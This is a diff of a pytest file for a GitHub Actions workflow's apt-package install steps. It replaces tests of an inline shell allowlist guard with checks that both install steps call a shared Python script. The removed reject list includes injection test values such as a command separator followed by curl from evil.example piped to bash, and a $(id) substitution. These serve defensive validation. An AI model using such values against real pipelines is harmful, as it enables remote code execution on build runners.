@@ -14,29 +14,25 @@ before detect ever runs — so zero rules are evaluated.
 
 The wiring is asserted as YAML shape, same rationale as
 test_apt_packages_and_summary_parse.py: the protected behaviour is GitHub
-Actions' own and cannot be exercised without a runner.  The step's allowlist
-guard, by contrast, IS executed — lifted verbatim from the workflow and run
-against accepted and rejected values — and is pinned byte-identical to the
-tests-reusable copy so the two cannot drift.
+Actions' own and cannot be exercised without a runner.  The package-name check
+lives in install_apt_packages.py (executed by test_install_apt_packages.py);
+here both of the suite's install steps — the ``apt-packages`` input and the
+``.github/ci-system-deps.txt`` file the bootstrap writes — are pinned to call
+it, and the D series to wait on both (FND-4908).
 """
 
 from __future__ import annotations
 
-import os
-import subprocess
 import sys
 from pathlib import Path
+from typing import Any
 
 import pytest
-import yaml
 
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 
 from _conformance_series import load_workflow, series, suite_job  # noqa: E402
 from _gha_expr import evaluate  # noqa: E402
-
-REPO_ROOT = Path(__file__).resolve().parents[3]
-TESTS_REUSABLE = REPO_ROOT / ".github" / "workflows" / "tests-reusable.yaml"
 
 APT_STEP_NAME = "Install system packages (apt-packages)"
 
@@ -57,11 +53,6 @@ def d_detect(suite: dict) -> dict:  # type: ignore[type-arg]
     synced = [entry for entry in series(suite) if entry.needs_env]
     assert len(synced) == 1, f"expected one env-syncing series, got {synced}"
     return synced[0].detect
-
-
-@pytest.fixture(scope="module")
-def tests_workflow() -> dict:  # type: ignore[type-arg]
-    return yaml.safe_load(TESTS_REUSABLE.read_text())
 
 
 def test_apt_packages_input_is_declared_and_off_by_default(workflow: dict) -> None:  # type: ignore[type-arg]
@@ -198,115 +189,111 @@ def test_only_the_d_series_materialises_the_environment(suite: dict) -> None:  #
 
 
 # ---------------------------------------------------------------------------
-# apt-packages validation: run the real guard from the workflow's own script.
+# Both install steps go through install_apt_packages.py (FND-4908).
 # ---------------------------------------------------------------------------
-#
-# Same rationale as test_apt_packages_and_summary_parse.py: the value must
-# reach `apt-get install` unquoted, so it is matched whole against a strict
-# Debian package-name allowlist first.  These tests EXECUTE the guard lifted
-# verbatim from the workflow, with the value supplied through the environment
-# exactly as GitHub supplies it — a test that re-stated the regex would keep
-# passing while the workflow drifted.
+
+SCRIPT = '"$RUNNER_TEMP/install_apt_packages.py"'
+FILE_STEP_ID = "system-deps-file"
+DEPS_FILE = ".github/ci-system-deps.txt"
 
 
-def _apt_guard(job: dict) -> str:  # type: ignore[type-arg]
-    """Lift the printf|tr|grep validation pipeline out of the apt step."""
-    script = _apt_step(job)["run"]
-    lines = script.splitlines()
-    starts = [i for i, line in enumerate(lines) if line.strip().startswith("printf")]
-    assert starts, (
-        "apt step no longer validates the value before installing — if the "
-        "guard was rewritten, update this test to execute the new form"
+Step = dict[str, Any]
+
+
+def _steps(job: dict) -> list[Step]:  # type: ignore[type-arg]
+    steps: list[Step] = job["steps"]
+    return steps
+
+
+def _step_id(job: dict, step_id: str) -> Step:  # type: ignore[type-arg]
+    matches = [s for s in _steps(job) if s.get("id") == step_id]
+    assert len(matches) == 1, f"expected one step with id {step_id!r}"
+    return matches[0]
+
+
+def test_apt_step_runs_the_shared_script(suite: dict) -> None:  # type: ignore[type-arg]
+    assert _apt_step(suite)["run"].strip() == f"python3 {SCRIPT} --env APT_PACKAGES"
+
+
+def test_the_script_is_fetched_and_kept_past_the_tree_cleanup(suite: dict) -> None:  # type: ignore[type-arg]
+    """Fetched with the lock-check scripts at this workflow's own SHA, copied
+    out of the tree before that checkout is removed (so no series scans it),
+    unconditionally: the file step below needs it without any input set."""
+    steps = _steps(suite)
+    fetch = next(
+        i
+        for i, s in enumerate(steps)
+        if str(s.get("with", {}).get("path")) == ".sdk-lock-check"
     )
-    start = starts[0]
-    end = start
-    while lines[end].rstrip().endswith("\\"):
-        end += 1
-    guard = "\n".join(line.strip() for line in lines[start : end + 1])
-    assert "grep" in guard, f"guard is not an allowlist match: {guard!r}"
-    return guard.replace("\\\n", " ")
-
-
-def test_apt_step_validates_before_it_installs(suite: dict) -> None:  # type: ignore[type-arg]
-    """The guard exists, runs before the install, and cannot fail open."""
-    script = _apt_step(suite)["run"]
-    _apt_guard(suite)
-    assert "set -euo pipefail" in script, (
-        "apt step must set -e explicitly — relying on the runner default lets "
-        "a later `defaults: run: shell:` make the guard fail open "
-        "(docs/standards/ci.md)"
+    fetch_with: dict[str, str] = steps[fetch]["with"]
+    assert fetch_with["ref"] == "${{ job.workflow_sha }}"
+    assert ".github/scripts/install_apt_packages.py" in (
+        fetch_with["sparse-checkout"].split()
     )
-    assert script.index("printf") < script.index("apt-get install"), (
-        "the allowlist guard must run before apt-get install"
+    keep = next(
+        i
+        for i, s in enumerate(steps)
+        if str(s.get("run", "")).startswith(
+            "cp .sdk-lock-check/.github/scripts/install_apt_packages.py "
+        )
     )
+    assert "if" not in steps[keep]
+    assert str(steps[keep]["run"]).endswith('"$RUNNER_TEMP/install_apt_packages.py"')
+    remove = next(
+        i for i, s in enumerate(steps) if s.get("run") == "rm -rf .sdk-lock-check"
+    )
+    assert fetch < keep < remove < steps.index(_apt_step(suite))
 
 
-def test_apt_guard_is_byte_identical_to_tests_reusable(
+def test_the_declared_file_is_installed_through_the_script(
+    suite: dict, d_detect: dict
+) -> None:  # type: ignore[type-arg]
+    """The bootstrap's .github/ci-system-deps.txt used to reach apt-get through
+    `xargs` in the vendored detect action, unchecked.  It now goes through the
+    script here, before D, for every repo that has the file."""
+    step = _step_id(suite, FILE_STEP_ID)
+    assert step["run"].strip() == f"python3 {SCRIPT} --file {DEPS_FILE}"
+    assert f"hashFiles('{DEPS_FILE}') != ''" in step["if"]
+    assert "private-git-deps" not in step["if"], (
+        "the file applies to every repo that declares it, not only ones with "
+        "private git deps"
+    )
+    steps = _steps(suite)
+    assert steps.index(_apt_step(suite)) < steps.index(step) < steps.index(d_detect)
+
+
+@pytest.mark.parametrize("event,force_all,dependency", _SCENARIOS)
+def test_file_step_follows_the_d_series_relevance_gate(
     suite: dict,
-    tests_workflow: dict,  # type: ignore[type-arg]
+    d_detect: dict,
+    event: str,
+    force_all: bool,
+    dependency: str,
 ) -> None:
-    """One guard, two workflows: pin the copies together so a fix to one that
-    misses the other fails here rather than silently half-landing."""
-    tests_unit = tests_workflow["jobs"]["unit"]
-    assert _apt_guard(suite) == _apt_guard(tests_unit), (
-        "conformance apt guard has drifted from the tests-reusable copy"
+    """Evaluated with the `hashFiles` term (which the evaluator does not
+    model) taken as true: the rest of the gate must match D's."""
+    gate = _step_id(suite, FILE_STEP_ID)["if"].replace(
+        f"&& hashFiles('{DEPS_FILE}') != ''", ""
     )
-
-
-# The Hive list, plus the C++/versioned names whose `+` and `.` the allowlist
-# must not reject.
-ACCEPTED = [
-    "libkrb5-dev gcc python3-dev",
-    "g++",
-    "libstdc++6",
-    "python3.11-dev",
-]
-# One entry per rejected class, not one per exploit string.
-REJECTED = [
-    "libkrb5-dev:amd64",  # arch-qualified
-    "libkrb5-dev=1.2.3",  # version-pinned
-    "-y",  # apt flag
-    "./local.deb",  # local package path
-    "lib*",  # glob — DOES expand on the unquoted use
-    "libkrb5-dev; curl evil.example/sh | bash",  # command separator
-    "libkrb5-dev $(id)",  # substitution syntax
-    "LibKrb5-Dev",  # not a legal Debian name
-]
-
-
-def _run_guard(guard: str, value: str) -> subprocess.CompletedProcess[str]:
-    """Execute the guard with the value injected through the environment —
-    the same route GitHub uses for the step's `env:` block."""
-    return subprocess.run(
-        ["bash", "-c", f"set -euo pipefail\n{guard}\n"],
-        capture_output=True,
-        text=True,
-        timeout=30,
-        env={"PATH": os.environ.get("PATH", ""), "APT_PACKAGES": value},
+    assert "hashFiles" not in gate
+    contexts = _contexts(
+        apt="",
+        event=event,
+        force_all=force_all,
+        dependency=dependency,
+        apt_outcome="skipped",
     )
+    assert evaluate(gate, contexts) == evaluate(d_detect["if"], contexts)
 
 
-@pytest.mark.parametrize("value", ACCEPTED)
-def test_apt_guard_accepts_real_package_lists(suite: dict, value: str) -> None:  # type: ignore[type-arg]
-    proc = _run_guard(_apt_guard(suite), value)
-    assert proc.returncode == 0, (
-        f"guard rejected a legitimate package list {value!r} — the apt step "
-        f"would fail the D leg before detect runs.\nstderr: {proc.stderr}"
+@pytest.mark.parametrize("step_id", ["git-deps-presync", "detect-dependency"])
+def test_nothing_syncs_after_a_failed_file_install(suite: dict, step_id: str) -> None:  # type: ignore[type-arg]
+    """A rejected or failed install means `uv sync` fails too, further from
+    the cause."""
+    contexts = _contexts(
+        apt="", event="push", force_all=False, dependency="", apt_outcome="skipped"
     )
-
-
-@pytest.mark.parametrize("value", REJECTED)
-def test_apt_guard_rejects_anything_that_is_not_a_package_name(
-    suite: dict,  # type: ignore[type-arg]
-    value: str,
-) -> None:
-    proc = _run_guard(_apt_guard(suite), value)
-    assert proc.returncode != 0, (
-        f"guard accepted {value!r}, which is not a list of Debian package names"
-    )
-
-
-def test_apt_guard_rejects_an_empty_value(suite: dict) -> None:  # type: ignore[type-arg]
-    """Belt to the step's `if:` brace: were the gate ever dropped, an empty
-    value must not reach `apt-get install` with no arguments."""
-    assert _run_guard(_apt_guard(suite), "").returncode != 0
+    contexts["inputs"]["private-git-deps"] = True
+    contexts["steps"][FILE_STEP_ID] = {"outcome": "failure"}
+    contexts["steps"]["git-deps-presync"] = {"outcome": "skipped"}
+    assert not evaluate(_step_id(suite, step_id)["if"], contexts)
